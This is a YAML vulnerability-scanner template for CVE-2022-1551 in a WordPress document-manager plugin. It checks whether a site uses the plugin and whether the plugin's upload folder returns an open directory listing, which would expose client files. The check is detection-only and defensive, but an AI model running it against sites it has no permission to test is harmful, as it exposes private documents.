name: yaml-poc-smartypantsplugins-sp_project_\&_document_manager-leak-CVE-2022-1551
binding: a68d8d37-5072-4e28-85e0-2fdcc1ec573e
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-1551/
        - https://wpscan.com/vulnerability/51b4752a-7922-444d-a022-f1c7159b5d84
    vulnerability:
        id: a8bdeb89-e53a-4410-b9a6-5e7999aa0c7e
        level: medium
    warning: Harmless
transport: http
rules:
    check:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("wp-content/plugins/sp-client-document-manager")
    r0:
        request:
            cache: true
            method: GET
            path: /wp-content/uploads/sp-client-document-manager/1/
            follow_redirects: false
        expression: response.status == 200 && response.title_string.contains("Index of")
expression: check() && r0()
